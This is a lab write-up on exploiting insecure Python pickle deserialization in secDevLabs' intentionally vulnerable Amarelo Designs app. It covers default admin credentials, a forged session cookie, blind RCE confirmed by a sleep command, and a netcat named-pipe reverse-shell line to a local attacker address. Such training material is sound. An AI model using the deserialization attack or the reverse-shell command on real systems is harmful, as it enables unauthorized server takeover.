# Attack Narrative - Amarelo Designs
The main goal of this document is to describe how a malicious user could exploit a vulnerability, intentionally installed on Amarelo Designs from secDevLabs, to obtain a blind remote code execution.

If you don't know [secDevLabs] or this [intended vulnerable web application][2] yet, you should check them before reading this narrative.

---
## 👀

It's possible to reach the server's web application from the HTTP port 5000, as shown by the image below:

<img src="attack1.png" align="center"/>

Making use of the [Dirb] tool to search for webpages, we were able to find `/user` and `/admin`, as shown by the picture below:

<p align="center">
    <img src="attack2.png"/>
</p>

When accessed, the `/admin` page exposes an authentication screen, as depicted by the image: 

<p align="center">
    <img src="attack3.png"/>
</p>

## 🔥

A quick test utilizing `admin` as the credentials for the `Username` and `Password` fields gives us acess to an Admin Dashboard, as shown below:

<img src="attack4.png" align="center"/>

Now, using [Burp Suite] as proxy to intercept the login request, we can see that the app returns a session cookie, `sessionId`, as depicted below:

<img src="attack5.png" align="center"/>

After decoding the cookie, which is in base64, the following structure was found:

<img src="attack6.png" align="center"/>

The structure found is very similar to the ones created with the function [Pickle]. We can be certain of that by having a look at the app's code. The hint is now confirmed, the app uses Pickle, as we can see from the image below:


<img src="attack7.png" align="center"/>

If an atacker knew that the app is using Pickle as the serialization method, he could create a malicious cookie to take advantage of it and execute code remotely. An example of the cookie is as shown:

<img src="attack8.png" align="center"/>

In order to be certain that the app is exploitable, we will send a sleep command to make the app unresposive for 10 seconds. If the app takes 10 seconds to return our request, than it's confirmed, the app is exploitable. As we can see from the image below, the app takes some time to return our request, thus confirming that it is exploitable and confirming the remote code execution: 

<img src="attack9.png" align="center"/>

In order to show how an attacker could have access to the server through an RCE, we will use the code depicted on the image below and an attacker listening on the 9051 port will receive a reverse shell.

<img src="attack10.png" align="center"/>

The code used above creates a named pipe `f` and redirects to it the output of `/bin/sh -i 2>&1|nc 192.168.56.101 9051` and then forwards it to the attacker. As we can see from the image below, the attacker listening on the 9051 port then receives the reverse shell from the server hosting the app.

<p align="center">
    <img src="attack11.png"/>
</p>


[secDevLabs]: https://github.com/globocom/secDevLabs
[2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a8/amarelo-designs
[Dirb]: https://tools.kali.org/web-applications/dirb
[Burp Suite]: https://en.wikipedia.org/wiki/Burp_suite
[Pickle]: https://docs.python.org/2/library/pickle.html